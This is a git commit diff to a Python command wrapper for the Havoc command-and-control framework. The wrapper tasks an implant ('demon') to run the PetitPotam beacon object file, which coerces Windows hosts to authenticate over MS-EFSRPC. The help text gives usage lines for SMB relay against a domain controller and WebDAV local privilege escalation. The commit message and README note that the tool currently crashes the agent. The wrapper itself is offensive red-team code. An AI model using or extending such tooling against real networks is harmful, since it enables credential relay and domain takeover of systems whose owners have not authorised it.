7a90dc702052bc7dd4c817ee5a5865e06c438594
Lav <l.m@securescape.cc>
2024-05-08 19:24:27 +0100

    suffering - Tried debugging process  - Having issues running the BOF and getting any output (Agent dies)

--- PetitPotam.py
+++ PetitPotam.py
@@ -4,23 +4,29 @@ from struct import pack, calcsize
 def petitpotam(demonID, *param):
     TaskID : str    = None
     demon  : Demon  = None
-    packer = Packer()
-    demon  = Demon( demonID )
 
-    num_params = len(param)
-    target = ''
-    capture_server = ''
+    packer          = Packer()
+    demon           = Demon( demonID )
+    num_params      = len(param)
+    target          = ''
+    capture_server  = ''
+
 
     if num_params != 2:
         demon.ConsoleWrite( demon.CONSOLE_ERROR, 'Only accepts two parameters [Capture Server, Target]' )
         return False
 
-    packer.addstr(target)
-    packer.addstr(capture_server)
+    packer.addWstr(target)
+    packer.addWstr(capture_server)
 
-    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, "Tasked demon to coerce with PetitPotam")
+    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon to coerce with PetitPotam - USING bin/PetitPotam.{demon.ProcessArch}.o")
+
     demon.InlineExecute( TaskID, "go", f"bin/PetitPotam.{demon.ProcessArch}.o", packer.getbuffer(), False )
 
     return TaskID
 
-RegisterCommand(petitpotam, "", "petitpotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC.", 0, "Capture Server", "Target")
+RegisterCommand(petitpotam, "", "petitpotam", "Coerce Windows hosts to authenticate to other machines via MS-EFSRPC", 0, "[Capture Server] [Target]", """
+                    SMB Relay Attack                : petitpotam KALI DC2019
+                    WebDAV LPE Attack               : petitpotam KALI@80/nop localhost
+                    WebDAV LPE w/SOCKS and rportfwd : petitpotam localhost@80/nop localhost
+                """)
--- README.md
+++ README.md
@@ -1,2 +1,5 @@
 # PetitPotam
 PetitPotam BOF Wrapper for Havoc - Credits for the BOF goes to [Outflank](https://github.com/outflanknl/C2-Tool-Collection/tree/main/BOF/PetitPotam)
+
+>[!warning]
+>Currently crashes and kills your beacon
